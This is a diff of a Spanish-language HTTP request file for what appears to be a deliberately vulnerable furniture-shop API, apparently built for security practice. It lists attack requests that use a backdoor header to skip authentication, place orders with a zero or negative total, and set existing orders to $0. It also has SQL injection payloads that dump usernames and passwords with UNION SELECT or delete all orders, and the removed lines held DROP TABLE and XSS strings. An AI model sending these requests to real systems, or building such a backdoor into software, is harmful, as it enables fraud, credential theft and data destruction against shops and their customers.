@@ -110,81 +110,83 @@ X-AccessDev: Testing-Mode
 X-AccessDev: Testing-Mode
 
 ### =====================================================
-### BACKDOOR EN PRODUCTOS (CREATE/UPDATE/DELETE)
+### BACKDOOR EN PEDIDOS (VULNERABILIDAD REAL)
+### =====================================================
+### ⚠️ NOTA: Los precios de productos están protegidos ($15000 mínimo)
+### La vulnerabilidad REAL está en los PEDIDOS con total $0
+### Requiere header X-AccessDev para bypass de autenticación
 ### =====================================================
 
-### 19. Backdoor - Crear producto sin autenticación
-POST {{apiUrl}}/productos
+### 19. Backdoor - Crear pedido con total $0 (¡PRODUCTOS GRATIS!)
+POST {{apiUrl}}/orders
 Content-Type: application/json
 X-AccessDev: Testing-Mode
 
 {
-  "nombre": "Producto via Backdoor",
-  "descripcion": "Creado usando header de desarrollo",
-  "precio": 99.99,
-  "stock": 50,
-  "categoria": "test",
-  "imagenUrl": "https://example.com/backdoor.jpg"
+  "items": [
+    {
+      "productId": 1,
+      "nombre": "Sofa Patagonia",
+      "precio": 89999.99,
+      "quantity": 3
+    },
+    {
+      "productId": 5,
+      "nombre": "Mesa Comedor Pampa",
+      "precio": 65000.00,
+      "quantity": 2
+    }
+  ],
+  "total": 0,
+  "shipping_address": "Backdoor Street 666"
 }
 
-### 20. Backdoor - Actualizar producto sin autenticación
-PUT {{apiUrl}}/productos/1
+### 20. Backdoor - Pedido con total negativo (¡TE PAGAN!)
+POST {{apiUrl}}/orders
 Content-Type: application/json
 X-AccessDev: Testing-Mode
 
 {
-  "precio": 1.00,
-  "stock": 999
+  "items": [
+    {
+      "productId": 8,
+      "nombre": "Cama Neuquen",
+      "precio": 78500.00,
+      "quantity": 1
+    }
+  ],
+  "total": -50000,
+  "shipping_address": "Negative Price Avenue"
 }
 
-### 21. Backdoor - Eliminar producto sin autenticación
-DELETE {{apiUrl}}/productos/100
-Content-Type: application/json
+### 21. Backdoor - Ver todos los pedidos sin autenticación
+GET {{apiUrl}}/orders
 X-AccessDev: Testing-Mode
 
 ### =====================================================
-### BACKDOOR - EXPLOTACIÓN AVANZADA
+### BACKDOOR - MODIFICACIÓN DE PEDIDOS
 ### =====================================================
 
-### 22. Backdoor + SQLi en productos
-POST {{apiUrl}}/productos
+### 22. Backdoor - Modificar total de pedido existente a $0
+PUT {{apiUrl}}/orders/1
 Content-Type: application/json
 X-AccessDev: Testing-Mode
 
 {
-  "nombre": "Test'); DROP TABLE products; --",
-  "descripcion": "SQLi attempt",
-  "precio": 1.00,
-  "stock": 1,
-  "categoria": "exploit",
-  "imagenUrl": "https://example.com/sqli.jpg"
+  "total": 0,
+  "status": "completed"
 }
 
-### 23. Backdoor + XSS en productos
-POST {{apiUrl}}/productos
-Content-Type: application/json
+### 23. Backdoor + SQLi - Ver todos los pedidos
+GET {{apiUrl}}/orders/1' OR '1'='1
 X-AccessDev: Testing-Mode
 
-{
-  "nombre": "<script>alert('XSS')</script>",
-  "descripcion": "<img src=x onerror=alert('XSS')>",
-  "precio": 1.00,
-  "stock": 1,
-  "categoria": "xss",
-  "imagenUrl": "<img src=x onerror=alert('XSS')>"
-}
-
-### 24. Backdoor - Modificación masiva con SQLi
-PUT {{apiUrl}}/productos/1' OR '1'='1
-Content-Type: application/json
+### 24. Backdoor + SQLi - Extraer usuarios desde pedidos
+GET {{apiUrl}}/orders/1' UNION SELECT id,username,email,password,role,1,1,NOW(),NOW() FROM users WHERE '1'='1
 X-AccessDev: Testing-Mode
 
-{
-  "precio": 0.01
-}
-
-### 25. Backdoor - Eliminación masiva con SQLi
-DELETE {{apiUrl}}/productos/1' OR '1'='1
+### 25. Backdoor - Eliminar pedidos con SQLi
+DELETE {{apiUrl}}/orders/1' OR '1'='1
 Content-Type: application/json
 X-AccessDev: Testing-Mode
 
@@ -199,9 +201,10 @@ X-AccessDev: Testing-Mode
 ### - GET /api/admin/stats  
 ### - GET /api/admin/audit-logs
 ### - DELETE /api/admin/users/:id
-### - POST /api/productos
-### - PUT /api/productos/:id
-### - DELETE /api/productos/:id
+### - POST /api/orders (⚠️ VULNERABILIDAD REAL: total $0)
+### - GET /api/orders
+### - PUT /api/orders/:id (modificar total a $0)
+### - DELETE /api/orders/:id
 ### - GET /api/auth/profile (con backdoor, sin token)
 ###
 ### ❌ NO funciona con:
@@ -209,11 +212,21 @@ X-AccessDev: Testing-Mode
 ### - Valores case-sensitive incorrectos
 ### - Sin el header
 ###
+### 🛡️ PROTEGIDO (Falsa vulnerabilidad):
+### - Precios de productos: NO se pueden actualizar < $15000
+### - POST/PUT /api/productos con precio bajo → Error 400
+###
 ### 🚨 Impacto: CRÍTICO
 ### - Bypass completo de autenticación
 ### - Acceso a funciones administrativas
-### - Creación/modificación/eliminación sin credenciales
+### - ⚠️ VULNERABILIDAD REAL: Crear pedidos con total $0
+### - Modificar pedidos existentes a $0
 ### - Se registra en audit_log como 'backdoor_access'
+###
+### 💡 ESTRATEGIA:
+### Los atacantes pueden PENSAR que pueden manipular precios de productos,
+### pero la VERDADERA vulnerabilidad está en los PEDIDOS (total = $0).
+### Esto requiere el header backdoor para bypass de autenticación.
 ###
 ### =====================================================
 X-AccessDev:  Testing-Mode 
